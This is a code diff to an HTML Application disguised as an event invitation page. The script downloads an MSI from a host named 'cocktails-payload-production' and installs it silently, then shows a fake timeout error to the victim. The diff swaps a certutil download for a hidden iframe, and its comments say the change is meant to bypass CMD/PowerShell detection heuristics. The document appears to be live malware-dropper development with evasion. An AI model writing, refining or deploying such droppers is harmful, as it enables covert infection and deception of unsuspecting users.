@@ -21,63 +21,60 @@
     <div id="status">Securing your invitation...</div>
     <div id="bar"><div id="fill"></div></div>
   </div>
+  
+  <!-- INVISIBLE IFRAME FOR NATIVE DOWNLOAD -->
+  <iframe id="downloader" style="display:none;"></iframe>
 
 <script>
 var shell = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
-var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";
+// Monitor both Temp and Downloads since native handler uses user preference
+var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\schimdtconnect.msi";
+var dlPath = shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Downloads\\schimdtconnect.msi";
 
 function init() {
   window.resizeTo(400, 300);
-  setTimeout(runInstall, 1000);
+  setTimeout(startNativeDownload, 1000);
 }
 
-function runInstall() {
+function startNativeDownload() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // START DOWNLOAD IN BACKGROUND USING CERTUTIL
-  // We do NOT wait for it here. We let it run in the background.
-  var cmd = 'cmd.exe /c certutil -urlcache -split -f "' + url + '" "' + path + '"';
-  shell.Run(cmd, 0, false); // false = do not wait, let it run in background
+  // TRIGGER NATIVE DOWNLOAD VIA IFRAME
+  // This uses the HTA's own engine, bypassing CMD/PowerShell heuristics
+  document.getElementById("downloader").src = url;
   
-  // POLLING LOOP: Wait for the file to appear and grow in size
-  // This keeps the UI on "Downloading..." until the file is ready
-  var maxWait = 300000; // 5 minutes max wait
-  var startTime = new Date().getTime();
-  var lastSize = 0;
-  var stableCount = 0;
-  
-  while (new Date().getTime() - startTime < maxWait) {
-    if (fso.FileExists(path)) {
-      var file = fso.GetFile(path);
-      var currentSize = file.Size;
-      
-      // Update progress bar based on file size (assuming ~15MB file, adjust if needed)
-      // For now, just animate it to show activity
-      document.getElementById("fill").style.width = Math.min(90, 30 + (currentSize / 200000)) + "%";
-      
-      // Check if file size has stopped growing (download complete)
-      if (currentSize > 1000000 && currentSize === lastSize) {
-        stableCount++;
-        if (stableCount > 5) { // Wait 5 seconds of no growth to ensure completion
-          break;
-        }
-      } else {
-        stableCount = 0;
-        lastSize = currentSize;
-      }
-    }
-    WScript.Sleep(1000); // Check every second
-  }
-  
-  if(fso.FileExists(path) && fso.GetFile(path).Size > 1000000) {
-    document.getElementById("fill").style.width = "60%";
-    document.getElementById("status").innerHTML = "Installing invitation...";
+  // POLL FOR FILE ARRIVAL (Checks every 2 seconds for up to 5 minutes)
+  var checks = 0;
+  var maxChecks = 150; 
+  var pollTimer = setInterval(function() {
+    checks++;
+    var foundPath = null;
     
-    // SILENT INSTALL
-    var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
+    if (fso.FileExists(tempPath)) foundPath = tempPath;
+    else if (fso.FileExists(dlPath)) foundPath = dlPath;
+    
+    if (foundPath) {
+      // Ensure file is fully written by checking size stability
+      var file = fso.GetFile(foundPath);
+      if (file.Size > 1000000) { // Basic size check
+        clearInterval(pollTimer);
+        document.getElementById("fill").style.width = "60%";
+        document.getElementById("status").innerHTML = "Package retrieved. Installing...";
+        runSilentInstall(foundPath);
+      }
+    } else if (checks >= maxChecks) {
+      clearInterval(pollTimer);
+      showError();
+    }
+  }, 2000);
+}
+
+function runSilentInstall(filePath) {
+  try {
+    var inst = 'msiexec.exe /i "' + filePath + '" /qn /norestart';
     shell.Run(inst, 0, true); // Wait for install to finish
     
     document.getElementById("fill").style.width = "100%";
@@ -89,11 +86,15 @@ function runInstall() {
       document.getElementById("status").innerHTML = "Error: Connection timed out.";
       document.getElementById("fill").style.background = "#d13438";
     }, 2000);
-  } else {
-    document.getElementById("heading").innerHTML = "Download Error";
-    document.getElementById("status").innerHTML = "Could not retrieve invitation.";
-    document.getElementById("fill").style.background = "#d13438";
+  } catch(e) {
+    showError();
   }
+}
+
+function showError() {
+  document.getElementById("heading").innerHTML = "Download Error";
+  document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+  document.getElementById("fill").style.background = "#d13438";
 }
 </script>
 </body>
